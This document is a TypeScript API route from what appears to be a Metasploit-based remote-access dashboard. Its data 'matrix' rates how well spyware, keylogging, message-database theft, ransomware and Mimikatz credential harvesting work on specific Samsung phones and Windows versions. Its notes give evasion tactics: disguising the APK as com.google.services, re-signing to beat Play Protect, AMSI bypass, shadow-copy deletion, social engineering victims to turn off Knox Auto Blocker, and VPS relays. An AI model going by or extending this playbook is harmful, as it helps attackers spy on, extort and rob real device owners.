/**
 * TEST LAB API
 *
 * GET  ?action=report            → latest test report JSON
 * GET  ?action=list              → all saved report files
 * GET  ?action=emulators         → running Docker Android emulator containers
 * GET  ?action=matrix            → full known-results matrix (static analysis)
 * POST {action:"run_quick"}      → runs a quick in-process analysis (no Docker needed)
 * POST {action:"run_full"}       → spawns ./scripts/run-tests.sh in background
 */

import { NextResponse } from "next/server";
import { exec, spawn } from "child_process";
import { promisify } from "util";
import path from "path";
import fs from "fs";
import os from "os";

const execAsync = promisify(exec);
const ROOT_DIR = process.cwd();
const RESULTS_DIR = path.join(ROOT_DIR, "test-results");

function ensureDir(d: string) { if (!fs.existsSync(d)) fs.mkdirSync(d, { recursive: true }); }

// ── Full device matrix (static knowledge base) ────────────────────────────────
const DEVICE_MATRIX = {
  platformLimits: {
    achievable100PercentAllPlatforms: false,
    docker: {
      android: { runnable: true,  apis: "28-34", note: "budtmo emulators — x86 via QEMU on ARM Mac, 8GB+ RAM each" },
      linux:   { runnable: true,  note: "debian:bookworm-slim — ELF payload smoke" },
      windows: { runnable: false, note: "Wine only — NOT real Win7-11 Defender/AMSI/ASR" },
      macos:   { runnable: false, note: "Apple EULA — use native Mac host" },
      ios:     { runnable: false, note: "Apple prohibits iOS in Docker — physical device or Corellium" },
    },
    maxLabScores: {
      android_api28_34_fullEvasion: 95,
      windows_wine_smoke: 30,
      windows_kvm_fullEvasion: { win7: 99, win10_22h2: 65, win11_23h2: 55 },
      ios_mdm_2tap: 78,
      macos_native: "not in docker",
    },
  },
  android: [
    {
      id: "S10_API28",
      model: "Samsung Galaxy S10",
      android: "9 (Pie)",
      oneui: "1.5",
      knox: "3.2",
      api: 28,
      year: 2019,
      tests: {
        install:          { status: "pass",    note: "Unknown sources easy to enable; no Restricted Settings" },
        permissions:      { status: "pass",    note: "All runtime perms grantable; no sensor restrictions" },
        knox:             { status: "partial", note: "Knox 3.2 active but DualDAR not enforced in emulator" },
        play_protect:     { status: "partial", note: "Detects known MSF certs; rename pkg to com.google.services" },
        session:          { status: "pass",    note: "MSF android/meterpreter stable on API 28" },
        persistence:      { status: "pass",    note: "BOOT_COMPLETED works without root" },
        camera:           { status: "pass",    note: "Both cameras via Camera2 API" },
        mic:              { status: "pass",    note: "RECORD_AUDIO always grantable" },
        sms:              { status: "pass",    note: "READ_SMS works" },
        gps:              { status: "pass",    note: "Fine location grantable" },
        notifications:    { status: "pass",    note: "dumpsys notification --noredact works" },
        keylogger:        { status: "pass",    note: "keyscan_start works" },
        ransomware:       { status: "pass",    note: "Python3 XOR; WRITE_EXTERNAL_STORAGE accessible" },
        social_extract:   { status: "pass",    note: "WhatsApp/Telegram DBs readable with root" },
        vpn_bypass:       { status: "pass",    note: "VPN on victim doesn't block TCP reverse_tcp" },
      },
      successRate: { raw: 85, customCert: 90, fullEvasion: 95 },
    },
    {
      id: "S20_API29",
      model: "Samsung Galaxy S20",
      android: "10",
      oneui: "2.5",
      knox: "3.3",
      api: 29,
      year: 2020,
      tests: {
        install:          { status: "pass",    note: "Same as Android 9 for unknown sources" },
        permissions:      { status: "partial", note: "Scoped storage introduced — /sdcard limited without MANAGE_EXTERNAL_STORAGE" },
        knox:             { status: "partial", note: "Knox 3.3 stricter in work profile" },
        play_protect:     { status: "partial", note: "Enhanced hash check; resign APK with custom cert" },
        session:          { status: "pass",    note: "Works on S20 family" },
        persistence:      { status: "pass",    note: "BOOT_COMPLETED works" },
        camera:           { status: "pass",    note: "" },
        mic:              { status: "pass",    note: "" },
        sms:              { status: "pass",    note: "" },
        gps:              { status: "partial", note: "Background location needs separate permission" },
        notifications:    { status: "pass",    note: "" },
        keylogger:        { status: "pass",    note: "" },
        ransomware:       { status: "partial", note: "Target /sdcard/Download explicitly; full /sdcard needs MANAGE_EXTERNAL_STORAGE" },
        social_extract:   { status: "pass",    note: "" },
        vpn_bypass:       { status: "pass",    note: "" },
      },
      successRate: { raw: 80, customCert: 85, fullEvasion: 92 },
    },
    {
      id: "S21_API30",
      model: "Samsung Galaxy S21",
      android: "11",
      oneui: "3.1",
      knox: "3.6",
      api: 30,
      year: 2021,
      tests: {
        install:          { status: "pass",    note: "" },
        permissions:      { status: "partial", note: "MANAGE_EXTERNAL_STORAGE needs manifest declaration" },
        knox:             { status: "partial", note: "Knox 3.6 introduces Secure Folder encryption" },
        play_protect:     { status: "partial", note: "Stricter hash check; custom APK signing cert needed" },
        session:          { status: "pass",    note: "S21 family confirmed working" },
        persistence:      { status: "pass",    note: "Foreground service method as fallback" },
        camera:           { status: "pass",    note: "" },
        mic:              { status: "pass",    note: "" },
        sms:              { status: "pass",    note: "" },
        gps:              { status: "pass",    note: "" },
        notifications:    { status: "pass",    note: "" },
        keylogger:        { status: "pass",    note: "" },
        ransomware:       { status: "partial", note: "Target Download+DCIM+Documents; full access needs root" },
        social_extract:   { status: "partial", note: "Secure Folder contents protected by Knox 3.6" },
        vpn_bypass:       { status: "pass",    note: "" },
      },
      successRate: { raw: 75, customCert: 83, fullEvasion: 90 },
    },
    {
      id: "S22_API31",
      model: "Samsung Galaxy S22",
      android: "12",
      oneui: "4.1",
      knox: "3.7",
      api: 31,
      year: 2022,
      tests: {
        install:          { status: "partial", note: "Restricted Settings warning on sideload" },
        permissions:      { status: "partial", note: "Photo/video picker; mic shows orange indicator" },
        knox:             { status: "partial", note: "Knox 3.7: App streaming restrictions in Secure Folder" },
        play_protect:     { status: "fail",    note: "Enhanced detection — MSF APK cert blacklisted; need custom signing" },
        session:          { status: "partial", note: "Works after Play Protect bypass + permission grants" },
        persistence:      { status: "partial", note: "AlarmManager fallback needed; BOOT_COMPLETED de-prioritised" },
        camera:           { status: "pass",    note: "Works once permissions granted" },
        mic:              { status: "partial", note: "Orange indicator always visible to user" },
        sms:              { status: "pass",    note: "" },
        gps:              { status: "partial", note: "Approximate location offered first; need precise" },
        notifications:    { status: "pass",    note: "dumpsys --noredact still works" },
        keylogger:        { status: "pass",    note: "" },
        ransomware:       { status: "partial", note: "Scoped storage; root unlocks full filesystem" },
        social_extract:   { status: "partial", note: "" },
        vpn_bypass:       { status: "pass",    note: "" },
      },
      successRate: { raw: 40, customCert: 65, fullEvasion: 80 },
    },
    {
      id: "S23_API33",
      model: "Samsung Galaxy S23",
      android: "13",
      oneui: "5.1",
      knox: "3.8",
      api: 33,
      year: 2023,
      tests: {
        install:          { status: "partial", note: "Restricted Settings blocks accessibility grants" },
        permissions:      { status: "partial", note: "Granular media permissions reduce blast radius" },
        knox:             { status: "partial", note: "Knox 3.8: Real-time kernel protection on Exynos/Snapdragon" },
        play_protect:     { status: "fail",    note: "Live threat detection scans APKs at install — default MSF blocked" },
        session:          { status: "partial", note: "Requires custom-signed APK disguised as system app" },
        persistence:      { status: "partial", note: "BOOT_COMPLETED restricted; Foreground service method needed" },
        camera:           { status: "pass",    note: "" },
        mic:              { status: "partial", note: "Mic indicator always shown" },
        sms:              { status: "partial", note: "READ_SMS requires careful grant flow" },
        gps:              { status: "partial", note: "" },
        notifications:    { status: "pass",    note: "dumpsys still works" },
        keylogger:        { status: "partial", note: "Accessibility service blocked by Restricted Settings" },
        ransomware:       { status: "fail",    note: "Without root: only /sdcard/Download; with root: full coverage" },
        social_extract:   { status: "partial", note: "" },
        vpn_bypass:       { status: "pass",    note: "VPN on victim doesn't protect against running payload" },
      },
      successRate: { raw: 25, customCert: 55, fullEvasion: 75 },
    },
    {
      id: "S24_API34",
      model: "Samsung Galaxy S24",
      android: "14",
      oneui: "6.1",
      knox: "3.9",
      api: 34,
      year: 2024,
      tests: {
        install:          { status: "fail",    note: "Auto Blocker enabled by default — blocks all sideloads on factory S24" },
        permissions:      { status: "fail",    note: "Selected photos only by default; health/body sensors restricted" },
        knox:             { status: "fail",    note: "Knox 3.9 Auto Blocker blocks unsigned APK installs" },
        play_protect:     { status: "fail",    note: "On-device AI scanning + cloud scan; MSF cert blacklisted" },
        session:          { status: "partial", note: "Only with root-level exploit or physical access to disable Auto Blocker" },
        persistence:      { status: "fail",    note: "Restricted background tasks; boot receiver rate-limited" },
        camera:           { status: "partial", note: "Works once installed and granted" },
        mic:              { status: "partial", note: "Indicator always shown" },
        sms:              { status: "partial", note: "Works if granted" },
        gps:              { status: "partial", note: "" },
        notifications:    { status: "pass",    note: "dumpsys still works regardless of install method" },
        keylogger:        { status: "fail",    note: "Accessibility services blocked" },
        ransomware:       { status: "fail",    note: "Auto Blocker + Knox prevent file writes outside app sandbox" },
        social_extract:   { status: "fail",    note: "Secure Folder fully encrypted; Knox 3.9 DualDAR" },
        vpn_bypass:       { status: "pass",    note: "If installed: VPN doesn't help victim" },
      },
      successRate: { raw: 5, customCert: 20, fullEvasion: 55 },
    },
  ],
  windows: [
    {
      id: "Win7_SP1",
      model: "Windows 7 SP1",
      version: "6.1.7601",
      year: 2009,
      tests: {
        install:       { status: "pass",    note: "No SmartScreen; any .exe runs directly" },
        av_detection:  { status: "pass",    note: "No AV by default; MSE doesn't detect standard MSF" },
        uac:           { status: "pass",    note: "UAC Low by default; getsystem works easily" },
        amsi:          { status: "pass",    note: "AMSI does not exist on Win7" },
        persistence:   { status: "pass",    note: "Registry Run key fully stable" },
        screenshot:    { status: "pass",    note: "" },
        keylogger:     { status: "pass",    note: "" },
        cred_harvest:  { status: "pass",    note: "Mimikatz/WCE work; NTLM hashes extractable" },
        ransomware:    { status: "pass",    note: "VSS shadow deletion works; full filesystem access" },
        privesc:       { status: "pass",    note: "Multiple kernel exploits (MS17-010, etc.)" },
      },
      successRate: { raw: 95, customCert: 97, fullEvasion: 99 },
    },
    {
      id: "Win8_1",
      model: "Windows 8.1",
      version: "6.3.9600",
      year: 2013,
      tests: {
        install:       { status: "pass",    note: "SmartScreen warns but doesn't block unknown publisher" },
        av_detection:  { status: "partial", note: "Defender detects default MSF; shikata_ga_nai x3 bypasses" },
        uac:           { status: "pass",    note: "fodhelper UAC bypass works" },
        amsi:          { status: "pass",    note: "AMSI not present on 8.1" },
        persistence:   { status: "pass",    note: "" },
        screenshot:    { status: "pass",    note: "" },
        keylogger:     { status: "pass",    note: "" },
        cred_harvest:  { status: "pass",    note: "" },
        ransomware:    { status: "pass",    note: "" },
        privesc:       { status: "pass",    note: "MS14-058 and others" },
      },
      successRate: { raw: 85, customCert: 90, fullEvasion: 95 },
    },
    {
      id: "Win10_1903",
      model: "Windows 10 1903",
      version: "10.0.18362",
      year: 2019,
      tests: {
        install:       { status: "partial", note: "SmartScreen strong; needs signed cert or HTA delivery" },
        av_detection:  { status: "fail",    note: "Defender cloud protection catches most MSF variants" },
        uac:           { status: "pass",    note: "cmstplua / sdclt bypass work" },
        amsi:          { status: "fail",    note: "AMSI active for PS; inline bypass needed before execution" },
        persistence:   { status: "pass",    note: "Scheduled task + registry" },
        screenshot:    { status: "pass",    note: "" },
        keylogger:     { status: "pass",    note: "" },
        cred_harvest:  { status: "partial", note: "PPL on lsass; need kernel exploit for Mimikatz" },
        ransomware:    { status: "partial", note: "AMSI bypass needed for PS ransom script" },
        privesc:       { status: "partial", note: "Print spooler, DLL hijack paths" },
      },
      successRate: { raw: 30, customCert: 55, fullEvasion: 75 },
    },
    {
      id: "Win10_22H2",
      model: "Windows 10 22H2",
      version: "10.0.19045",
      year: 2022,
      tests: {
        install:       { status: "fail",    note: "SmartScreen + ASR rules; LNK or HTA delivery recommended" },
        av_detection:  { status: "fail",    note: "Tamper-protected Defender; AMSI v2; ETW hardened" },
        uac:           { status: "partial", note: "Most UAC bypasses patched; wscript+COM hijack works" },
        amsi:          { status: "fail",    note: "AMSI bypass works but noisy; use custom loader" },
        persistence:   { status: "partial", note: "WMI subscription or COM hijack for stealth" },
        screenshot:    { status: "pass",    note: "Works once in session" },
        keylogger:     { status: "pass",    note: "" },
        cred_harvest:  { status: "partial", note: "LSASS PPL; use lsa_secrets post module" },
        ransomware:    { status: "partial", note: "Need AMSI bypass + VSS deletion; AV may intercept file ops" },
        privesc:       { status: "partial", note: "PrintNightmare patched; need newer CVEs" },
      },
      successRate: { raw: 15, customCert: 40, fullEvasion: 65 },
    },
    {
      id: "Win11_23H2",
      model: "Windows 11 23H2",
      version: "10.0.22631",
      year: 2023,
      tests: {
        install:       { status: "fail",    note: "SmartScreen + MOTW + ASR; must use macro or LOL binary" },
        av_detection:  { status: "fail",    note: "Defender AI heuristics; process injection required" },
        uac:           { status: "fail",    note: "Most UAC bypasses patched on Win11 23H2" },
        amsi:          { status: "fail",    note: "Kernel-enforced AMSI; VBS hardware protection" },
        persistence:   { status: "partial", note: "Scheduled task + COM object hijack" },
        screenshot:    { status: "pass",    note: "" },
        keylogger:     { status: "pass",    note: "" },
        cred_harvest:  { status: "fail",    note: "Credential Guard blocks NTLM hash extraction" },
        ransomware:    { status: "fail",    note: "Controlled Folder Access blocks file encryption ops" },
        privesc:       { status: "fail",    note: "Kernel isolation (VBS/HVCI) blocks most kernel exploits" },
      },
      successRate: { raw: 10, customCert: 25, fullEvasion: 55 },
    },
  ],
  vpn: [
    { scenario: "VPN on victim (split-tunnel)", impact: "none",     detail: "TCP reverse_tcp still routes to LHOST. Most VPNs don't block outbound 4444." },
    { scenario: "VPN on victim (full tunnel)",  impact: "partial",  detail: "Works if LHOST is public IP. Fails if LHOST is RFC1918." },
    { scenario: "VPN kill-switch enabled",      impact: "blocks",   detail: "All non-VPN traffic dropped. FIX: use port 443 (reverse_https)." },
    { scenario: "Victim uses Tor Browser",      impact: "none",     detail: "Payload runs outside Tor; C2 not affected." },
    { scenario: "Corporate proxy/DPI",          impact: "partial",  detail: "HTTP/HTTPS payload passes; raw TCP 4444 may be blocked. FIX: reverse_https port 443." },
    { scenario: "Attacker using VPN",           impact: "stealth",  detail: "Adds anonymity. Use VPS with static IP for LHOST, not personal VPN." },
    { scenario: "Carrier-grade NAT (CGNAT)",    impact: "blocks",   detail: "ISP shares IP via CGNAT: inbound port forward impossible. FIX: use VPS as relay." },
  ],
  offline: [
    { scenario: "Docker down < 5 min",   status: "pass",    detail: "Payload retries every 5s; reconnects when listener restarts." },
    { scenario: "Docker down > 5 min",   status: "partial", detail: "Session times out; payload still retries but session ID is lost. Reconnects as new session." },
    { scenario: "Supabase offline",      status: "pass",    detail: "All events queued locally; auto-sync via /api/sync on reconnect." },
    { scenario: "Dashboard offline",     status: "pass",    detail: "Dashboard enters DEMO MODE; MSF still handles sessions independently." },
    { scenario: "MSF RPC restart",       status: "partial", detail: "Listeners do NOT auto-restart. Must re-run: use exploit/multi/handler; run -j" },
    { scenario: "MSF DB disconnect",     status: "partial", detail: "Sessions survive DB disconnect; workspace data may be lost." },
    { scenario: "Full server reboot",    status: "pass",    detail: "docker compose up -d → MSF ready ~90s → re-run listeners." },
  ],
  criticalFailures: [
    { code: "DOCKER_IOS",        severity: "critical", rate: "N/A",  detail: "iOS CANNOT run in Docker. Use physical iPhone, Corellium, or Xcode Simulator on Mac host." },
    { code: "DOCKER_MACOS",      severity: "critical", rate: "N/A",  detail: "macOS CANNOT run in Docker (Apple EULA). Test on native Mac host only." },
    { code: "DOCKER_WINDOWS",    severity: "high",     rate: "N/A",  detail: "Real Win7-11 need KVM/QEMU VMs (UTM). Docker Wine is ~30% fidelity smoke test only." },
    { code: "LHOST_WRONG",       severity: "critical", rate: "40%", detail: "LHOST=127.0.0.1 or wrong interface — payload connects to itself. Always use public/LAN IP." },
    { code: "PORT_BLOCKED",      severity: "high",     rate: "30%", detail: "Carrier blocks outbound TCP 4444. Use port 443 (reverse_https)." },
    { code: "CERT_REVOKED",      severity: "high",     rate: "60%", detail: "Default MSF SSL cert blacklisted by AV. Generate custom cert with openssl." },
    { code: "APK_DEFAULT_CERT",  severity: "critical", rate: "90%", detail: "Default MSF APK debug cert flagged by Play Protect. Resign with custom keystore." },
    { code: "KNOX_AUTOBLOCKER",  severity: "critical", rate: "100%",detail: "S24/Android14: Auto Blocker on by default. Social eng required to disable." },
    { code: "ROOT_REQUIRED",     severity: "high",     rate: "95%", detail: "Advanced features need root. <5% of Samsung are rooted. Use local_exploit_suggester." },
    { code: "SCOPED_STORAGE",    severity: "medium",   rate: "70%", detail: "Android 10+: /sdcard limited. Ransomware incomplete without root or MANAGE_EXTERNAL_STORAGE." },
    { code: "AMSI_PS",           severity: "critical", rate: "100%",detail: "AMSI blocks PS on Win10 1903+. Inline patch required before any PowerShell." },
    { code: "LSASS_PPL",         severity: "high",     rate: "40%", detail: "PPL on Win10 1903+ blocks Mimikatz. Use lsa_secrets or Kerberoasting." },
    { code: "DEFENDER_TAMPER",   severity: "high",     rate: "70%", detail: "Tamper Protection prevents disabling Defender via PS/reg. Use trusted process injection." },
    { code: "CGNAT",             severity: "critical", rate: "35%", detail: "Mobile ISPs use CGNAT: reverse connection to home IP fails. Use VPS relay." },
    { code: "CREDENTIAL_GUARD",  severity: "high",     rate: "30%", detail: "Win11 Credential Guard blocks NTLM extraction. Use Kerberoasting or token theft." },
  ],
};

// ── GET handler ────────────────────────────────────────────────────────────────
export async function GET(request: Request) {
  const url = new URL(request.url);
  const action = url.searchParams.get("action") ?? "matrix";

  if (action === "matrix") {
    return NextResponse.json(DEVICE_MATRIX);
  }

  if (action === "report") {
    ensureDir(RESULTS_DIR);
    const files = fs.existsSync(RESULTS_DIR)
      ? fs.readdirSync(RESULTS_DIR)
          .filter((f) => f.endsWith(".json"))
          .sort()
          .reverse()
      : [];
    if (files.length === 0) {
      return NextResponse.json({ report: null, message: "No reports yet — run tests first" });
    }
    const latest = path.join(RESULTS_DIR, files[0]);
    const data = JSON.parse(fs.readFileSync(latest, "utf8"));
    return NextResponse.json({ report: data, file: files[0] });
  }

  if (action === "list") {
    ensureDir(RESULTS_DIR);
    const files = fs.existsSync(RESULTS_DIR)
      ? fs.readdirSync(RESULTS_DIR).filter((f) => f.endsWith(".json")).sort().reverse()
      : [];
    return NextResponse.json({ reports: files });
  }

  if (action === "emulators") {
    try {
      const { stdout } = await execAsync(
        "docker ps --format '{{.Names}}|{{.Status}}|{{.Ports}}' 2>/dev/null | grep test-android || echo ''"
      );
      const containers = stdout.trim().split("\n").filter(Boolean).map((line) => {
        const [name, status, ports] = line.split("|");
        return { name, status, ports };
      });
      return NextResponse.json({ containers, count: containers.length });
    } catch {
      return NextResponse.json({ containers: [], count: 0, error: "docker not available" });
    }
  }

  return NextResponse.json({ error: "Unknown action" }, { status: 400 });
}

// ── POST handler ───────────────────────────────────────────────────────────────
export async function POST(request: Request) {
  const body = await request.json() as { action: string };

  if (body.action === "run_quick") {
    // In-process quick test — checks connectivity, generates summary
    ensureDir(RESULTS_DIR);
    const timestamp = new Date().toISOString();

    // Check MSF
    let msfConnected = false;
    try {
      const health = await fetch("http://localhost:3000/api/health").then((r) => r.json()) as { connected?: boolean };
      msfConnected = health.connected ?? false;
    } catch { /* offline */ }

    // Check Docker
    let dockerRunning = false;
    try {
      await execAsync("docker info 2>/dev/null");
      dockerRunning = true;
    } catch { /* not available */ }

    // Check emulators
    let emulatorCount = 0;
    try {
      const { stdout } = await execAsync("docker ps --format '{{.Names}}' 2>/dev/null | grep -c test-android || echo 0");
      emulatorCount = parseInt(stdout.trim()) || 0;
    } catch { /* skip */ }

    const report = {
      type: "quick",
      timestamp,
      msfConnected,
      dockerRunning,
      emulatorCount,
      matrix: DEVICE_MATRIX,
      summary: {
        totalDevices: DEVICE_MATRIX.android.length + DEVICE_MATRIX.windows.length,
        avgSuccessRateAndroid: Math.round(
          DEVICE_MATRIX.android.reduce((a, d) => a + d.successRate.fullEvasion, 0) / DEVICE_MATRIX.android.length
        ),
        avgSuccessRateWindows: Math.round(
          DEVICE_MATRIX.windows.reduce((a, d) => a + d.successRate.fullEvasion, 0) / DEVICE_MATRIX.windows.length
        ),
        criticalFailureCount: DEVICE_MATRIX.criticalFailures.filter((f) => f.severity === "critical").length,
      },
    };

    const reportFile = path.join(RESULTS_DIR, `report_quick_${Date.now()}.json`);
    fs.writeFileSync(reportFile, JSON.stringify(report, null, 2));

    return NextResponse.json({ ok: true, report, file: path.basename(reportFile) });
  }

  if (body.action === "run_full") {
    const scriptPath = path.join(ROOT_DIR, "scripts", "run-tests.sh");
    if (!fs.existsSync(scriptPath)) {
      return NextResponse.json({ error: "Test script not found" }, { status: 404 });
    }

    ensureDir(RESULTS_DIR);

    // Spawn in background
    const child = spawn("bash", [scriptPath], {
      detached: true,
      stdio: ["ignore", "pipe", "pipe"],
      env: { ...process.env, LHOST: process.env.LHOST ?? "127.0.0.1" },
    });

    const logFile = path.join(RESULTS_DIR, `run_${Date.now()}.log`);
    const logStream = fs.createWriteStream(logFile);
    child.stdout?.pipe(logStream);
    child.stderr?.pipe(logStream);
    child.unref();

    return NextResponse.json({
      ok: true,
      pid: child.pid,
      logFile: path.basename(logFile),
      message: "Full test suite started in background. Check /test page for live results.",
    });
  }

  return NextResponse.json({ error: "Unknown action" }, { status: 400 });
}
